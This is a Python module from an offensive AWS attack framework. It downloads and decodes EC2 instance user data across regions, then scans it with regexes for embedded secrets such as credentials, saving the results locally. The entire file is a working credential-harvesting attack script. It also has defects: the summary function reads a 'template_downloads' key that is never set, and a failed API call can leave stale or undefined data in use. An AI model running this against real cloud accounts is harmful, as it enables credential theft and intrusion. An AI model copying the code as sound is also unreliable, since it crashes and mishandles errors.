#!/usr/bin/env python3
import datetime

import argparse
import base64
import os
import gzip

from botocore.exceptions import ClientError
from core.secretfinder.utils import regex_checker, Color

def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()

    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    ######

    instances = []
    summary_data = {'instance_downloads': 0}

    if args.instance_ids is not None:
        for instance in args.instance_ids.split(','):
            instance_id, region = instance.split('@')
            instances.append({
                'InstanceId': instance_id,
                'Region': region
            })
    else:
        if fetch_data(['EC2', 'Instances'], technique_info['prerequisite_modules'][0], None) is False:
            print('Pre-req module not run successfully. Exiting...')
            return None
        instances = session.EC2['Instances']
    

    if not os.path.exists('sessions/{}/downloads/ec2_user_data/'.format(session.name)):
        os.makedirs('sessions/{}/downloads/ec2_user_data/'.format(session.name))

    if instances:
        print('Targeting {} instance(s)...'.format(len(instances)))
        for instance in instances:
            instance_id = instance['InstanceId']
            region = instance['Region']
            client = awsattack_main.get_boto3_client('ec2', region)

            try:
                user_data = client.describe_instance_attribute(
                    InstanceId=instance_id,
                    Attribute='userData'
                )['UserData']
            except ClientError as error:
                code = error.response['Error']['Code']
                print('FAILURE: ')
                if code == 'AccessDenied':
                    print('  Access denied to DescribeInstanceAttribute.')
                    print('Skipping the rest of the instances...')
                    break
                else:
                    print('  ' + code)

            if 'Value' in user_data.keys():
                decoded = base64.b64decode(user_data['Value'])

                if decoded[0] == 139:  # Byte \x8b (139) indicates gzip compressed content
                    decompressed = gzip.decompress(decoded)
                    formatted_user_data = '{}@{}:\n{}\n\n'.format(
                        instance_id,
                        region,
                        decompressed.decode('utf-8', 'backslashreplace')
                    )
                else:
                    formatted_user_data = '{}@{}:\n{}\n\n'.format(
                        instance_id,
                        region,
                        decoded.decode('utf-8', 'backslashreplace')
                    )

                print('  {}@{}: User Data found'.format(instance_id, region))

                #check for secrets 
                find_secrets(formatted_user_data)

                # Write to the "all" file
                with open('sessions/{}/downloads/ec2_user_data/all_user_data.txt'.format(session.name), 'a+') as data_file:
                    data_file.write(formatted_user_data)
                # Write to the individual file
                with open('sessions/{}/downloads/ec2_user_data/{}.txt'.format(session.name, instance_id), 'w+') as data_file:
                    data_file.write(formatted_user_data.replace('\\t', '\t').replace('\\n', '\n').rstrip())
                summary_data['instance_downloads'] += 1
            else:
                print('  {}@{}: No User Data found'.format(instance_id, region))
        print()
    else:
        print('No instances to target.\n')

    return summary_data

def find_secrets(userdata):
    detections = regex_checker(userdata)
    [Color.print(Color.GREEN, '\tDetected {}: {}'.format(itemkey, detections[itemkey])) for itemkey in detections]

def summary(data, awsattack_main):
    session = awsattack_main.get_active_session()
    out = '  Downloaded EC2 User Data for {} instance(s) and {} launch template(s) to ./sessions/{}/downloads/ec2_user_data/.\n'.format(data['instance_downloads'], data['template_downloads'], session.name)
    return out
